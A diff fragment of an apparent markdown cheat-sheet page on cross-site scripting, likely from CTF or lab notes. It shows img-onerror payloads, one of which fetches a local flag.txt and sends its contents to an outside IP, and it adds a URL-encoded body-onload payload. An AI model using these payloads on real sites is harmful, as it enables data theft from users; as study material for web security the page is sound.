@@ -137,6 +137,12 @@ You can [download a PDF version of the XSS cheat sheet](https://portswigger.net/
 >`<img src=x onerror="fetch('http://10.11.116.53:8080')"/>`
 >
 >`<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.11.116.53:8080/?c=' + r)).catch(e => fetch('http://10.11.116.53:8080/?c=' + e))"/>`
+>
+>`"%5c"><body%2fonload%3d%26lt%3b!--%26gt%3b%26%2310confirm(1)%3bprompt(%2fXSS%2f.source)>"%2c`
+
+
+
+
 
 
 ## Commonly Asked Question
